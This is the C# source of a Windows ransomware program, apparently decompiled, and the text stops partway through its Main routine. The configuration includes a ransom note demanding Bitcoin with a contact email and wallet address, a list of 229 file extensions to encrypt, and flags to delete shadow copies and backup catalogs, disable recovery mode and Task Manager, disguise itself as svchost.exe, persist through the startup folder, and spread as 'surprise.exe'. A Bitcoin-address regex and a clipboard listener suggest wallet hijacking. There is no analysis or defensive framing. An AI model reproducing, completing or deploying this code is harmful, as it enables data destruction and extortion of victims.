using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "encrypted";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "README!!!!.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"All of your files have been encrypted by denishatingclub.eu (aka DHC)", "Your computer was infected with a denishatingclub.eu ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help. What can I do to get my files back? You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer. The price for the software is ≈$42. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:", "Coinmama - https://www.coinmama.com/ Bitpanda - https://www.bitpanda.com/",
		"send a mail to knowdont228@proton.me after sending bitcoin to our address for get decryption software", "", "Payment information Amount: 0,001 BTC", "Bitcoin Address:  3Noaeg8zi1ErUeSf7YeM1eNWdaEdzJmADJ", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (isOver())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
